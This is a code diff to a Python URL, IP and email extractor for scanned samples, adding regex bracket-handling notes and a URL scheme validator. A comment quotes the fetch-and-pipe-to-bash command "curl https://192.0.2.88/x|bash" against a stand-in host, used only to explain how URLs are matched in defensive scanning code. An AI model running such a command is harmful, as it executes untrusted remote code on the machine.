@@ -53,6 +53,10 @@ REQUEST_TIMEOUT = 30.0  # seconds
 # without a TLD list (future work).
 # "|" is excluded: it must be %-encoded in a URL (RFC 3986), and in shell samples it
 # is pipe syntax -- "curl https://192.0.2.88/x|bash" ends the URL at the pipe.
+# ")", "]", "}" are excluded on the same reasoning: sample text wraps URLs in prose
+# and code -- "(see http://x/a)" must end at the ")". The accepted cost is that a
+# literal bracket in a path ("http://x/items[0]") truncates the match there; RFC 3986
+# wants those %-encoded anyway, and prose-wrapped URLs dominate in scanned samples.
 _URL_RE = re.compile(r"""https?://[^\s"'<>)\]}|]+""", re.IGNORECASE)
 _IPV4_RE = re.compile(r"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b")
 _EMAIL_RE = re.compile(r"[a-z0-9._%+-]+@([a-z0-9.-]+\.[a-z]{2,63})", re.IGNORECASE)
@@ -101,6 +105,14 @@ class UrlLookupInput(BaseModel):
         min_length=4,
         max_length=2048,
     )
+
+    @field_validator("url")
+    @classmethod
+    def _validate_url(cls, v: str) -> str:
+        v = v.strip()
+        if not v.lower().startswith(("http://", "https://")):
+            raise ValueError("URL must include an http:// or https:// scheme")
+        return v
 
 
 class IpLookupInput(BaseModel):
